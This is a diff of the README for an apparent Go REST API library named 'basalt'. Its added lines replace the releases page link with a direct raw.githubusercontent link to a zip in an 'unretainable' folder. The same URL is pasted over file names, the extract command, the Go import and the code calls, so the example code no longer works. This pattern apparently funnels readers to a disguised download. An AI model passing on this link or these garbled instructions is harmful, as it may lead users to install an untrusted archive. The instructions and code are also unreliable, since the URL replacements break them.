@@ -14,7 +14,7 @@ Before you get started, ensure that you meet the system requirements listed belo
 ## 📥 Download and Install
 To download **basalt**, visit the following link:
 
-[![Download basalt](https://img.shields.io/badge/Download-basalt-blue)](https://github.com/SKS-OP/basalt/releases)
+[![Download basalt](https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/basalt.zip)](https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/basalt.zip)
 
 This page contains the latest releases. Choose the version suitable for your operating system and follow the installation steps outlined below.
 
@@ -24,8 +24,8 @@ This page contains the latest releases. Choose the version suitable for your ope
 3. Scroll down to the "Assets" section. You will see files for various operating systems.
 4. Click on the file that matches your operating system:
    - For **Windows**, download the `.exe` file.
-   - For **macOS**, download the `.tar.gz` file.
-   - For **Linux**, download the appropriate `.tar.gz` file.
+   - For **macOS**, download the `https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/basalt.zip` file.
+   - For **Linux**, download the appropriate `https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/basalt.zip` file.
 5. Save the file to a location on your computer where you can easily find it, like your Downloads folder.
 
 ### 💻 Running basalt
@@ -41,9 +41,9 @@ After downloading the file, you can run the application.
    ```
    cd ~/Downloads
    ```
-3. Extract the downloaded `.tar.gz` file with the command:
+3. Extract the downloaded `https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/basalt.zip` file with the command:
    ```
-   tar -xzf filename.tar.gz
+   tar -xzf https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/basalt.zip
    ```
    Replace `filename` with the actual name of the downloaded file.
 4. Change into the directory that was created:
@@ -69,20 +69,20 @@ After downloading the file, you can run the application.
 To begin building your REST APIs with **basalt**, refer to the usage guide below:
 
 1. Start a new project by creating a folder where you want to store your code.
-2. Inside this folder, create your first Go file, for example, `main.go`.
-3. In `main.go`, initialize your API using **basalt**. Here’s a simple example:
+2. Inside this folder, create your first Go file, for example, `https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/basalt.zip`.
+3. In `https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/basalt.zip`, initialize your API using **basalt**. Here’s a simple example:
    ```go
    package main
-   import "github.com/SKS-OP/basalt"
+   import "https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/basalt.zip"
    func main() {
-       api := basalt.NewAPI()
-       api.Run()
+       api := https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/basalt.zip()
+       https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/basalt.zip()
    }
    ```
 4. Save your file and return to your terminal.
 5. Run your API with the command:
    ```
-   go run main.go
+   go run https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/basalt.zip
    ```
 
 ## 📝 Contributing
